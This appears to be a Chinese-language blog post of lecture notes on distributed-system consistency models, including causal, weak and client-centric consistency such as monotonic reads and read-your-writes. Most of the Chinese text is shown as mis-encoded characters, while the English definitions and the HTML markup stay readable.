<p>å·¦è¾¹è¿™ä¸ªå›¾ï¼ˆå…ˆä¸çœ‹çº¢è‰²çš„å­—ï¼‰æ˜¯æ»¡è¶³<strong>é¡ºåºä¸€è‡´æ€§</strong>çš„ã€‚P1çš„å†™aæ“ä½œç”±äºç½‘ç»œå»¶è¿Ÿç­‰å› ç´ ï¼Œåœ¨P2çš„å†™bæ“ä½œä¹‹åå‘ç”Ÿï¼Œæ‰€ä»¥P3å’ŒP4éƒ½æ˜¯å…ˆè¯»åˆ°bï¼Œå†è¯»åˆ°aã€‚å¦‚æœè¦æ»¡è¶³ä¸¥æ ¼ä¸€è‡´æ€§çš„è¯ï¼ˆçœ‹çº¢è‰²å­—ï¼‰ï¼Œé‚£ä¹ˆåœ¨P2å†™bæ“ä½œä¹‹åï¼Œæ‰€æœ‰è¿›ç¨‹åº”è¯¥åªèƒ½è¯»å‡ºbæ¥ï¼Œè¿™æ‰æ»¡è¶³ä¸¥æ ¼ä¸€è‡´æ€§ã€‚</p>
<p>å³è¾¹çš„å›¾ä¸æ»¡è¶³é¡ºåºä¸€è‡´æ€§ï¼ŒP3å…ˆè¯»åˆ°äº†bå†è¯»åˆ°aï¼ŒP4å…ˆè¯»åˆ°aå†è¯»åˆ°bã€‚è¿›ç¨‹å¯¹æ•°æ®å­˜å‚¨çš„è¯»å†™æ²¡æœ‰æŒ‰æŸç§åºåˆ—é¡ºåºè¿›è¡Œã€‚</p>
<p><strong>é¡ºåºä¸€è‡´æ€§ä¹Ÿæ˜¯æ¯”è¾ƒéš¾åšå‡ºæ¥çš„ã€‚ä½†æ˜¯æ˜¯ä¸€ä¸ªå¼ºä¸€è‡´æ€§ï¼Œé¡ºåºä¸€è‡´æ€§åšåˆ°äº† 100%çš„åˆ†å¸ƒå¼é€æ˜æ€§ã€‚</strong></p>
<h3 id="å› æœä¸€è‡´æ€§"><a href="#å› æœä¸€è‡´æ€§" class="headerlink" title="å› æœä¸€è‡´æ€§"></a>å› æœä¸€è‡´æ€§</h3><p><strong>åŸºæœ¬æ€æƒ³</strong></p>
<p>æ»¡è¶³å› æœæ¡ä»¶ä¸‹ï¼Œæ‰€æœ‰äººå¿…é¡»æ˜¯ä¸€è‡´çš„ï¼Œä¸æ»¡è¶³å› æœæ¡ä»¶å¯ä»¥ä¸ä¸€è‡´ã€‚</p>
<p>ä»æ•°æ®çš„äº§ç”Ÿå’Œæ¶ˆè´¹çš„è§’åº¦å»å®šä¹‰å› æœã€‚æ•°æ®æ€»æ˜¯äº§ç”Ÿåœ¨å‰ï¼Œæ¶ˆè´¹åœ¨åã€‚</p>
<p><strong>å› æœæ€§</strong></p>
<p>å¦‚æœäº‹ä»¶Bæ˜¯ç”±äº‹ä»¶Aå¼•èµ·çš„ï¼Œæˆ–å—åˆ°äº‹ä»¶Açš„å½±å“ï¼Œé‚£ä¹ˆå› æœå…³ç³»å¿…ç„¶è¦æ±‚å…¶ä»–æ¯ä¸ªäººå…ˆçœ‹åˆ°äº‹ä»¶Aå†çœ‹åˆ°äº‹ä»¶Bã€‚</p>
<p>è€ƒè™‘ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“çš„ç¤ºä¾‹ï¼š</p>
<p>å‡è®¾è¿›ç¨‹P1å¯¹æ•°æ®é¡¹xæ‰§è¡Œäº†å†™æ“ä½œã€‚ç„¶åè¿›ç¨‹P2å…ˆè¯»å–xï¼Œç„¶åå¯¹yæ‰§è¡Œå†™æ“ä½œã€‚è¿™é‡Œï¼Œå¯¹xçš„è¯»æ“ä½œå’Œå¯¹yçš„å†™æ“ä½œå…·æœ‰æ½œåœ¨çš„å› æœå…³ç³»ï¼Œå› ä¸ºyçš„è®¡ç®—å¯èƒ½ä¾èµ–äºP2æ‰€è¯»å–çš„xçš„å€¼(ä¹Ÿå³ï¼ŒP1å†™å…¥çš„å€¼)ã€‚</p>
<p><strong>æ½œåœ¨å› æœå…³ç³»</strong></p>
<ol>
<li><strong>åŒä¸€è¿›ç¨‹ï¼Œå…ˆè¯»å†å†™æœ‰å› æœå…³ç³»ã€‚</strong>å¾ˆå¯èƒ½æ˜¯è¯»å–äº†è¿™ä¸ªæ•°æ®æ‰èƒ½æ‰§è¡Œæ“ä½œï¼Œç„¶åå†™å…¥ç»“æœã€‚</li>
<li><strong>ä¸åŒè¿›ç¨‹ï¼Œå…ˆå†™å†è¯»æœ‰å› æœå…³ç³»ã€‚</strong>ä¸åŒçš„è¿›ç¨‹é—´ï¼Œä¸€ä¸ªæŠŠç»“æœå†™è¿›å»ï¼Œå¦ä¸€ä¸ªæ‰èƒ½å¤Ÿè¯»å‡ºæ¥ã€‚</li>
<li>ä¸¤ä¸ªè¯»ä¹‹é—´æ²¡æœ‰å› æœå…³ç³»ã€‚</li>
<li>ä¸¤ä¸ªå†™ä¹‹é—´æ²¡æœ‰å› æœå…³ç³»ã€‚</li>
<li>å› æœå…³ç³»å…·æœ‰ä¼ é€’æ€§ï¼Œe.g. If write1-&gt; read, and read -&gt; write2, then write1 -&gt; write2.</li>
</ol>
<p><strong>å®šä¹‰</strong></p>
<p>å¦‚æœæ•°æ®åº“æ˜¯å› æœä¸€è‡´çš„ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»æœä»ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<blockquote>
<p>æ‰€æœ‰è¿›ç¨‹å¿…é¡»ä»¥ç›¸åŒçš„é¡ºåºçœ‹åˆ°å…·æœ‰<strong>æ½œåœ¨å› æœå…³ç³»</strong>çš„å†™æ“ä½œã€‚</p>
<p>ä¸åŒè¿›ç¨‹ä¸Šå¯ä»¥ä»¥ä¸åŒçš„é¡ºåºçœ‹åˆ°å¹¶å‘çš„å†™æ“ä½œã€‚</p>
</blockquote>
<p>æˆ‘çœ‹åˆ°è¿™ä¸ªå®šä¹‰ä¹Ÿæ˜¯ä¸€è„¸æ‡µé€¼ï¼Œçœ‹å‡ ä¸ªä¾‹å­å°±æ‡‚äº†ã€‚</p>
<p><strong>ä¾‹å­1</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451805.png" alt="image-20190419153834211"></p>
<p>ç”±æ½œåœ¨å› æœå…³ç³»ç¬¬äºŒæ¡ï¼ŒP1å’ŒP2ä¹‹é—´ï¼Œå…ˆå‘ç”Ÿğ‘Š1(ğ‘¥)ğ‘ï¼Œå†å‘ç”Ÿğ‘…2(ğ‘¥)ğ‘ï¼Œå…ˆå†™å†è¯»ï¼Œå…·æœ‰æ½œåœ¨å› æœå…³ç³»ï¼Œæ‰€ä»¥è¯»å‡ºæ¥çš„ç»“æœå¿…é¡»æ˜¯ä¸€è‡´çš„ï¼Œæ‰€æœ‰è¿›ç¨‹éƒ½å¿…é¡»è¯»å‡ºaã€‚è¿™å°±æ˜¯å®šä¹‰ç¬¬ä¸€å¥è¯çš„æ„æ€ã€‚</p>
<p>ç”±æ½œåœ¨å› æœå…³ç³»ç¬¬å››æ¡ï¼Œä¸¤ä¸ªå†™ä¹‹é—´æ²¡æœ‰å› æœå…³ç³»ï¼Œæ‰€ä»¥ğ‘Š2(ğ‘¥)ğ‘å’Œğ‘Š1(ğ‘¥)ğ‘æ²¡æœ‰å› æœå…³ç³»ï¼Œé‚£ä¹ˆè¯»å‡ºä»€ä¹ˆç»“æœéƒ½æ»¡è¶³å› æœä¸€è‡´æ€§ï¼Œè¿™å°±æ˜¯å®šä¹‰ç¬¬äºŒå¥è¯çš„æ„æ€ã€‚ä½†æ˜¯è¿™é‡Œä¸æ»¡è¶³ä¸¥æ ¼ä¸€è‡´æ€§å’Œé¡ºåºä¸€è‡´æ€§ã€‚</p>
<p>å› æœå…³ç³»å…·æœ‰ä¼ é€’æ€§ï¼Œåœ¨P2å†…éƒ¨å‘ç”Ÿäº†å…ˆè¯»å†å†™ï¼Œç”±æ½œåœ¨å› æœå…³ç³»ç¬¬äºŒæ¡ï¼Œæ»¡è¶³å› æœå…³ç³»ï¼Œå†ç”±å› æœå…³ç³»çš„ä¼ é€’æ€§å¯çŸ¥ï¼Œğ‘Š1(ğ‘¥)ğ‘ä¸ğ‘Š2(ğ‘¥)ğ‘æ„æˆå› æœå…³ç³»ã€‚å›¾ä¸ŠåŸè°…è‰²ç®­å¤´æ‰€ç¤ºã€‚</p>
<p><strong>ä¾‹å­2ï¼š</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451806.png" alt="image-20190419155014568"></p>
<p>åˆšåˆšæ‰æåˆ°çš„ï¼Œç”±å› æœå…³ç³»çš„ä¼ é€’æ€§å¯çŸ¥ï¼Œğ‘Š1(ğ‘¥)ğ‘ä¸ğ‘Š2(ğ‘¥)ğ‘æ„æˆå› æœå…³ç³»ï¼Œæ‰€ä»¥åé¢æ‰€æœ‰è¿›ç¨‹è¯»å‡ºæ¥çš„ç»“æœéƒ½å¿…é¡»ä¸€è‡´ï¼Œä½†æ˜¯è¿™é‡Œä¸ä¸€è‡´ï¼Œæ‰€ä»¥ä¸æ»¡è¶³å› æœä¸€è‡´æ€§ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451807.png" alt="image-20190419155138555"></p>
<p>è¿™ä¸ªå°±æ»¡è¶³äº†ï¼Œå› ä¸ºä¸¤ä¸ªå¹¶å‘å†™æ²¡æœ‰å› æœå…³ç³»ã€‚</p>
<p><strong>åº”ç”¨</strong></p>
<p>å› æœä¸€è‡´æ€§æ˜¯é¦–å…ˆåº”ç”¨åœ¨å¤§é‡é›†ç¾¤ä¸­çš„ä¸€è‡´æ€§æ¨¡å‹ã€‚</p>
<p><strong>å®ç°æ–¹å¼ï¼š</strong></p>
<ul>
<li>å‘é‡æ—¶é’Ÿï¼šä½¿ç”¨å‘é‡æ—¶é—´æˆ³æ•è·å› æœå…³ç³»</li>
</ul>
<h3 id="åˆ†ç»„æ“ä½œ"><a href="#åˆ†ç»„æ“ä½œ" class="headerlink" title="åˆ†ç»„æ“ä½œ"></a>åˆ†ç»„æ“ä½œ</h3><p>åˆ†ç»„æ“ä½œæ˜¯ä¸€ä¸ªå¼±ä¸€è‡´æ€§æ¨¡å‹ã€‚å®è´¨æ˜¯ä¾é <strong>åŠ é”ï¼ˆè¿™ä¸ªé”å°±æ˜¯åŒæ­¥åŒ–å˜é‡ï¼‰</strong>ï¼Œå°†ä¸€äº›éåŸå­æ“ä½œç»„åˆä¸ºåŸå­æ“ä½œï¼Œä»è€Œå®ç°å¼±ä¸€è‡´æ€§ã€‚</p>
<p>ç”±äºå¼•å…¥äº†é”çš„æ¦‚å¿µï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿå°±å˜å¾—ä¸æ˜¯é‚£ä¹ˆé€æ˜äº†ã€‚</p>
<p><strong>åˆ†ç»„æ“ä½œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ ‡å‡†:</strong></p>
<blockquote>
<ol>
<li>åœ¨ä¸€ä¸ªè¿›ç¨‹å¯¹è¢«ä¿æŠ¤çš„å…±äº«æ•°æ®çš„æ‰€æœ‰æ›´æ–°æ“ä½œæ‰§è¡Œå®Œä¹‹å‰ï¼Œä¸å…è®¸å¦ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œå¯¹åŒæ­¥åŒ–å˜é‡çš„è·å–è®¿é—®ã€‚</li>
<li>å¦‚æœä¸€ä¸ªè¿›ç¨‹å¯¹æŸä¸ªåŒæ­¥åŒ–å˜é‡æ­£è¿›è¡Œäº’æ–¥æ¨¡å¼è®¿é—®ï¼Œé‚£ä¹ˆå…¶ä»–è¿›ç¨‹å°±ä¸èƒ½æ‹¥æœ‰è¯¥åŒæ­¥åŒ–å˜é‡ï¼Œå³ä½¿æ˜¯éäº’æ–¥æ¨¡å¼ä¹Ÿä¸è¡Œã€‚</li>
<li>æŸä¸ªè¿›ç¨‹å¯¹æŸä¸ªåŒæ­¥åŒ–å˜é‡çš„äº’æ–¥æ¨¡å¼è®¿é—®å®Œæˆåï¼Œé™¤éè¯¥å˜é‡çš„æ‹¥æœ‰è€…æ‰§è¡Œå®Œæ“ä½œï¼Œå¦åˆ™ä»»ä½•å…¶ä»–è¿›ç¨‹å¯¹è¯¥å˜é‡çš„ä¸‹ä¸€ä¸ªéäº’æ–¥æ¨¡å¼è®¿é—®ä¹Ÿæ˜¯ä¸å…è®¸çš„ã€‚</li>
</ol>
</blockquote>
<p><strong>è§£æï¼š</strong></p>
<ol>
<li>ç¬¬ä¸€ä¸ªæ¡ä»¶è¡¨ç¤ºï¼Œå½“ä¸€ä¸ªè¿›ç¨‹è·å¾—æ‹¥æœ‰æƒåï¼Œè¿™ç§æ‹¥æœ‰æƒç›´åˆ°æ‰€æœ‰è¢«ä¿æŠ¤çš„æ•°æ®éƒ½å·²æ›´æ–°ä¸ºæ­¢ã€‚æ¢å¥è¯è¯´ï¼Œå¯¹è¢«ä¿æŠ¤æ•°æ®çš„æ‰€æœ‰è¿œç¨‹ä¿®æ”¹éƒ½æ˜¯å¯è§çš„ã€‚ (è¿™ä¸ªè¿œç¨‹ä¿®æ”¹åˆæ˜¯ä¸ªå•¥ï¼Ÿï¼Ÿï¼Ÿ)</li>
<li>ç¬¬äºŒä¸ªæ¡ä»¶è¡¨ç¤ºï¼Œåœ¨æ›´æ–°ä¸€ä¸ªå…±äº«æ•°æ®é¡¹ä¹‹å‰ï¼Œè¿›ç¨‹å¿…é¡»ä»¥äº’æ–¥æ¨¡å¼è¿›å…¥ä¸´ç•ŒåŒºï¼Œä»¥ç¡®ä¿ä¸ä¼šæœ‰å…¶ä»–è¿›ç¨‹è¯•å›¾åŒæ—¶æ›´æ–°è¯¥å…±äº«æ•°æ®ã€‚</li>
<li>å¦‚æœä¸€ä¸ªè¿›ç¨‹è¦ä»¥éäº’æ–¥æ¨¡å¼è¿›å…¥ä¸´ç•ŒåŒºï¼Œå¿…é¡»é¦–å…ˆä¸è¯¥åŒæ­¥åŒ–å˜é‡çš„æ‹¥æœ‰è€…è¿›è¡Œåå•†ï¼Œç¡®ä¿ä¸´ç•ŒåŒºè·å¾—äº†è®¿é—®è¢«ä¿æŠ¤å…±äº«æ•°æ®çš„æœ€æ–°å‰¯æœ¬ã€‚</li>
</ol>
<p>æˆ‘æ„Ÿè§‰ä¸Šé¢åºŸè¯äº†è¿™ä¹ˆå¤šï¼Œå°±æ˜¯æƒ³è¯´ï¼š</p>
<ol>
<li>ä¸€ä¸ªè¿›ç¨‹è·å¾—ä¸€ä¸ªæ•°æ®çš„æ§åˆ¶æƒåï¼Œå…¶ä»–è¿›ç¨‹ä¸èƒ½å†è·å¾—è¿™ä¸ªæ•°æ®çš„æ§åˆ¶æƒï¼›</li>
<li>ä¸€ä¸ªè¿›ç¨‹åœ¨ä¿®æ”¹ä¸€ä¸ªæ•°æ®æ—¶ï¼Œå¿…é¡»ä»¥äº’æ–¥æ¨¡å¼è¿›å…¥ä¸´ç•ŒåŒºï¼›</li>
<li>è¿›ç¨‹ä»¥éäº’æ–¥æ¨¡å¼è¿›å…¥ä¸´ç•ŒåŒºï¼Œè¦å…ˆè·å¾—å…±äº«æ•°æ®çš„æœ€æ–°å‰¯æœ¬ã€‚</li>
</ol>
<p><strong>ä¾‹ï¼šå…¥å£ä¸€è‡´æ€§é—®é¢˜</strong></p>
<p>å…¥å£ä¸€è‡´æ€§çš„ç¼–ç¨‹é—®é¢˜: æ­£ç¡®åœ°æŠŠæ•°æ®ä¸åŒæ­¥åŒ–å˜é‡ç›¸å…³è”</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451808.png" alt="image-20190419175505219"></p>
<ol>
<li>P1è·å¾—äº†xçš„åŒæ­¥å˜é‡ï¼Œä¿®æ”¹xä¸€æ¬¡ï¼Œç„¶åå†è·å¾—yçš„åŒæ­¥å˜é‡ï¼Œä¿®æ”¹yï¼Œç„¶åé‡Šæ”¾xçš„åŒæ­¥å˜é‡ï¼Œå†é‡Šæ”¾yçš„åŒæ­¥å˜é‡ã€‚</li>
<li>è¿›ç¨‹P2è·å¾—äº†xçš„åŒæ­¥å˜é‡ï¼Œä½†æ˜¯æ²¡æœ‰è·å¾—yï¼Œå› æ­¤ä»–å¯ä»¥ä»xè¯»å–å€¼aï¼Œä½†å¦‚æœè¯»å–yåˆ™ä¸ºNILï¼Œå› ä¸ºè¿›ç¨‹P3é¦–å…ˆè·å¾—äº†yçš„åŒæ­¥å˜é‡ï¼Œæ‰€ä»¥å½“P1é‡Šæ”¾yçš„åŒæ­¥å˜é‡æ—¶ï¼ŒP3å¯ä»¥è¯»å¾—å€¼bã€‚</li>
</ol>
<h3 id="Weak-consistency-properties"><a href="#Weak-consistency-properties" class="headerlink" title="Weak consistency properties"></a>Weak consistency properties</h3><ul>
<li>Accesses to <em>synchronization</em> <em>variables</em> associated with a data store are sequentially consistent.</li>
<li>No operation on a synchronization variable is allowed to be performed until <em>all</em> <em>previous writes have been completed</em> everywhere.</li>
<li>No read or write operation on data items are allowed to be performed until <em>all previous operations to synchronization variables have been performed</em>.</li>
</ul>
<p>ä¾‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451809.png" alt="image-20190419180527374"></p>
<ol>
<li>Sè¡¨ç¤ºåŒæ­¥ï¼Œç”±äºP2ï¼ŒP3æ²¡æœ‰è¿›è¡ŒSæ“ä½œï¼Œæ‰€ä»¥æ˜¯ä¸ä¿è¯è¯»å–ç»“æœä¸€æ ·çš„ã€‚</li>
<li>å¯¹äºç¬¬äºŒä¸ª(b)ï¼ŒP1è¿›è¡Œäº†Sæ“ä½œï¼ŒP2ä¹Ÿåœ¨Rä¹‹å‰è¿›è¡Œäº†Sæ“ä½œï¼ŒP2åº”è¯¥è¯»å–R(x)bã€‚æ‰€ä»¥(b)è¿™ä¸ªä¾‹å­æ˜¯ä¸æ»¡è¶³å¼±ä¸€è‡´æ€§æ¨¡å‹çš„ã€‚å¦‚æœSåœ¨Råé¢ï¼Œåˆ™ä¸è¿åå¼±ä¸€è‡´æ€§æ¨¡å‹ã€‚</li>
</ol>
<h2 id="ä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹"><a href="#ä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹" class="headerlink" title="ä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹"></a>ä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹</h2><p>ä»¥å®¢æˆ·ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹ï¼Œåº•å±‚ä¸Šæ˜¯<strong>æ›´æ–°çš„ä¼ æ’­</strong>ã€‚</p>
<h3 id="æœ€ç»ˆä¸€è‡´æ€§-x2F-äº‹ä»¶ä¸€è‡´æ€§"><a href="#æœ€ç»ˆä¸€è‡´æ€§-x2F-äº‹ä»¶ä¸€è‡´æ€§" class="headerlink" title="æœ€ç»ˆä¸€è‡´æ€§&#x2F;äº‹ä»¶ä¸€è‡´æ€§"></a>æœ€ç»ˆä¸€è‡´æ€§&#x2F;äº‹ä»¶ä¸€è‡´æ€§</h3><blockquote>
<p>æ²¡æœ‰æ›´æ–°æ“ä½œæ—¶ï¼Œæ‰€æœ‰å‰¯æœ¬é€æ¸æˆä¸ºç›¸äº’å®Œå…¨ç›¸åŒçš„å‰¯æœ¬ã€‚</p>
</blockquote>
<p><strong>æœ€ç»ˆä¸€è‡´æ€§å®é™…ä¸Šåªè¦æ±‚æ›´æ–°æ“ä½œè¢«ä¿è¯ä¼ æ’­åˆ°æ‰€æœ‰å‰¯æœ¬ã€‚</strong></p>
<p>å¸¸ç”¨åœ¨å¹¿åŸŸç½‘ï¼Œåˆ†å¸ƒå¼æ•°æ®åº“ä¸Šã€‚</p>
<h3 id="ç¬¦å·è¯´æ˜"><a href="#ç¬¦å·è¯´æ˜" class="headerlink" title="ç¬¦å·è¯´æ˜"></a>ç¬¦å·è¯´æ˜</h3><ul>
<li><p>ğ‘‹ğ‘–[ğ‘¡]: Version of data item <em>x</em> at time <em>t</em> at local copy ğ¿ğ‘–</p>
<p>tæ—¶åˆ»æœ¬åœ°å‰¯æœ¬ğ¿ğ‘–ä¸­æ•°æ®é¡¹xçš„ç‰ˆæœ¬</p>
</li>
<li><p>ğ‘Šğ‘†(ğ‘¥ğ‘–[ğ‘¡]): all write operations at ğ¿ğ‘– since init</p>
<p>å¯¹ğ¿ğ‘–ä¸­çš„xè¿›è¡Œä¸€ç³»åˆ—å†™æ“ä½œå¾—åˆ°ğ‘‹ğ‘–[ğ‘¡]ï¼Œğ‘Šğ‘†(ğ‘¥ğ‘–[ğ‘¡])è¡¨ç¤ºè¿™ä¸€ç³»åˆ—å†™æ“ä½œçš„é›†åˆ</p>
</li>
<li><p>ğ‘Šğ‘†(ğ‘¥ğ‘–[ğ‘¡1],ğ‘¥ğ‘—[ğ‘¡2]): If operations in ğ‘Šğ‘†(ğ‘¥ğ‘–[ğ‘¡1]) have also been performed at local copy ğ¿ğ‘— at a later time <em>t</em>2, it is known that ğ‘Šğ‘†(ğ‘¥ğ‘–[ğ‘¡1]) is part of ğ‘Šğ‘†(ğ‘¥ğ‘—[ğ‘¡2])</p>
<p>t2æ—¶åˆ»ï¼Œ ğ‘Šğ‘†(ğ‘¥ğ‘–[ğ‘¡1])ä¸­çš„æ“ä½œä¹Ÿå·²ç»åœ¨æœ¬åœ°å‰¯æœ¬ğ¿ğ‘–ä¸Šæ‰§è¡Œå®Œæ¯•ï¼Œè¡¨ç¤ºæ›´æ–°ä¼ æ’­äº†ï¼Œè®°ä¸º ğ‘Šğ‘†(ğ‘¥ğ‘–[ğ‘¡1],ğ‘¥ğ‘—[ğ‘¡2])</p>
</li>
</ul>
<h3 id="å•è°ƒè¯»"><a href="#å•è°ƒè¯»" class="headerlink" title="å•è°ƒè¯»"></a>å•è°ƒè¯»</h3><p><strong>å®šä¹‰</strong></p>
<blockquote>
<p><em>If a process reads the value of a data item x, any successive read operation on x by that process will always return that same or a more recent value.</em></p>
<p>å¦‚æœä¸€ä¸ªè¿›ç¨‹è¯»å–æ•°æ®é¡¹xçš„å€¼ï¼Œé‚£ä¹ˆè¯¥è¿›ç¨‹å¯¹xæ‰§è¡Œçš„ä»»ä½•åç»­è¯»æ“ä½œå°†æ€»æ˜¯å¾—åˆ°ç¬¬ä¸€æ¬¡è¯»å–çš„é‚£ä¸ªå€¼æˆ–æ›´æ–°çš„å€¼ã€‚</p>
</blockquote>
<p><strong>è§£é‡Š</strong></p>
<p>Client â€œseesâ€ only same or newer version of data.</p>
<p>æ¥ä¸‹æ¥çš„è¯»æ“ä½œè¦ä¹ˆå’Œä¹‹å‰çš„è¯»æ“ä½œå€¼ä¸€æ ·ï¼Œè¦ä¹ˆå€¼æ¯”ä»–è¿˜æ–°ã€‚</p>
<p><strong>ä¾‹</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451810.png" alt="image-20190420005037923"></p>
<p>è¿›ç¨‹å…ˆåœ¨L1ä¸Šå¯¹xæ‰§è¡Œäº†ä¸€æ‰¹å†™æ“ä½œï¼Œåˆåœ¨L2ä¸Šå†æ‰§è¡Œä¸€æ‰¹å†™æ“ä½œã€‚</p>
<p>å›¾(a)æ»¡è¶³å•è°ƒè¯»ä¸€è‡´æ€§ã€‚åœ¨æ‰§è¡Œå¯¹L2å†™x2çš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠåœ¨L1ä¸Šçš„å†™æ“ä½œæ›´æ–°åˆ°L2çš„å‰¯æœ¬ä¸Šï¼Œå³å…ˆå†™å…¥x1ï¼Œå†å†™å…¥x2ã€‚è¿™æ ·ï¼Œåœ¨L2è¯»åˆ°x2æ—¶ï¼Œè¿™é‡Œé¢çš„x2æ˜¯åŒ…å«x1å†™æ“ä½œçš„å†…å®¹çš„ã€‚</p>
<p>è€Œå›¾(b)ä¸­å°±ä¸æ»¡è¶³äº†ï¼Œç›´æ¥å¯¹L2å†™x2ï¼Œé‚£ä¹ˆåœ¨åç»­è¯»åˆ°x2çš„æ—¶å€™ï¼Œåªæœ‰WS(x2)çš„å†…å®¹ï¼Œä¸åŒ…å«x1å¸¦æ¥çš„å†…å®¹ã€‚</p>
<h3 id="å•è°ƒå†™"><a href="#å•è°ƒå†™" class="headerlink" title="å•è°ƒå†™"></a>å•è°ƒå†™</h3><p><strong>å®šä¹‰</strong></p>
<blockquote>
<p><em>A write operation by a process on a data item x is completed before any successive write operation on x by the same process.</em></p>
<p>ä¸€ä¸ªè¿›ç¨‹å¯¹æ•°æ®é¡¹xæ‰§è¡Œçš„å†™æ“ä½œå¿…é¡»åœ¨è¯¥è¿›ç¨‹å¯¹xæ‰§è¡Œä»»ä½•åç»­å†™æ“ä½œä¹‹å‰å®Œæˆã€‚</p>
</blockquote>
<p><strong>è§£é‡Š</strong></p>
<p>Write happens on a copy only if itâ€™s brought up to date with preceding write operations on same data (but possibly at different copies).</p>
<p>ä¸¤ä¸ªå†™æ“ä½œï¼Œå‰é¢é‚£ä¸ªå†™æ“ä½œå†™å®Œï¼Œåé¢é‚£ä¸ªå†™æ“ä½œæ‰å†™</p>
<p>æ¯ä¸ªå†™æ“ä½œå®Œå…¨è¦†ç›–<em>x</em>çš„å½“å‰å€¼ï¼Œä½†æ˜¯æ²¡æœ‰å¿…è¦æ›´æ–°å‰¯æœ¬ã€‚å¦‚æœç°åœ¨å‰¯æœ¬ä¹Ÿè¦å†™ï¼Œå¿…é¡»å…ˆå®Œæˆä¹‹å‰çš„å†™æ“ä½œã€‚</p>
<p><strong>ä¾‹</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451811.png" alt="image-20190420010641362"></p>
<p>å›¾(a)ä¸­ï¼Œåœ¨W(x2)ä¹‹å‰ï¼Œå…ˆæŠŠW(x1)çš„æ“ä½œæ›´æ–°åˆ°L2(å°±æ˜¯WS(x1))ï¼Œæ»¡è¶³å•è°ƒå†™ä¸€è‡´æ€§ã€‚</p>
<p>å›¾(b)ä¸­ï¼Œbä¸­æ²¡æœ‰WS(x1)ï¼Œæ‰€ä»¥ä¸æ»¡è¶³å•è°ƒå†™ä¸€è‡´æ€§ã€‚</p>
<h3 id="è¯»å†™ä¸€è‡´æ€§-read-your-writes"><a href="#è¯»å†™ä¸€è‡´æ€§-read-your-writes" class="headerlink" title="è¯»å†™ä¸€è‡´æ€§ read-your-writes"></a>è¯»å†™ä¸€è‡´æ€§ read-your-writes</h3><p><strong>å®šä¹‰</strong></p>
<blockquote>
<p><em>The effect of a write operation by a process on data item x, will always be seen by a successive read operation on x by the same process.</em></p>
<p>ä¸€ä¸ªè¿›ç¨‹å¯¹æ•°æ®é¡¹xæ‰§è¡Œä¸€æ¬¡å†™æ“ä½œçš„ç»“æœæ€»æ˜¯ä¼šè¢«è¯¥è¿›ç¨‹å¯¹xæ‰§è¡Œçš„åç»­è¯»æ“ä½œçœ‹è§ã€‚</p>
</blockquote>
<p><strong>è§£é‡Š</strong></p>
<p>All previous writes are always completed before any successive read.</p>
<p>ä»»ä½•è¯»æ“ä½œå‘ç”Ÿä¹‹å‰ï¼Œåº”è¯¥å®Œæˆå…¨éƒ¨çš„å†™æ“ä½œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451812.png" alt="image-20190420011205118"></p>
<p>è¿›ç¨‹åœ¨L1ä¸­å†™äº†ä¸€æ¬¡x1ï¼Œåœ¨L2ä¸­è¿›è¡Œè¯»æ“ä½œï¼Œæ ¹æ®è¯»å†™ä¸€è‡´æ€§ï¼Œæ­¤æ—¶åº”è¯¥èƒ½æŠŠåœ¨L1ä¸­å†™å…¥çš„x1è¯»å‡ºæ¥ã€‚</p>
<p>å›¾(a)ä¸­ï¼Œåœ¨R(x2)å‘ç”Ÿä¹‹å‰ï¼Œæœ‰WS(x1;x2)æ“ä½œï¼Œæ‰€ä»¥W(x1)åœ¨R(x2)ä¹‹å‰è¢«ä¼ æ’­è¿‡æ¥äº†ã€‚</p>
<p>å›¾(b)ä¸­ï¼Œæ²¡æœ‰æŠŠW(x1)çš„æ“ä½œæ›´æ–°åˆ°L2ä¸­ï¼Œæ‰€ä»¥R(x2)ä¸­æ²¡æœ‰ä½“ç°x1çš„æ›´æ–°ï¼Œä¸æ»¡è¶³è¯»å†™ä¸€è‡´æ€§ã€‚</p>
<h3 id="å†™è¯»ä¸€è‡´æ€§-writes-follow-reads"><a href="#å†™è¯»ä¸€è‡´æ€§-writes-follow-reads" class="headerlink" title="å†™è¯»ä¸€è‡´æ€§ writes-follow-reads"></a>å†™è¯»ä¸€è‡´æ€§ writes-follow-reads</h3><p><strong>å®šä¹‰</strong></p>
<blockquote>
<p><em>A write operation by a process on a data item x following a previous read operation on x by the same process, is guaranteed to take place on the same or a more recent value of x that was read.</em></p>
<p>åŒä¸€ä¸ªè¿›ç¨‹ï¼Œå¯¹æ•°æ®é¡¹xæ‰§è¡Œçš„è¯»æ“ä½œä¹‹åçš„å†™æ“ä½œï¼Œä¿è¯å‘ç”Ÿåœ¨äºxè¯»å€¼ç›¸åŒæˆ–æ¯”å€¼æ›´æ–°çš„å€¼ä¸Šã€‚</p>
</blockquote>
<p><strong>è§£é‡Š</strong></p>
<p>Any successive write operation on x will be performed on a copy of x that is same or more recent than the last read.</p>
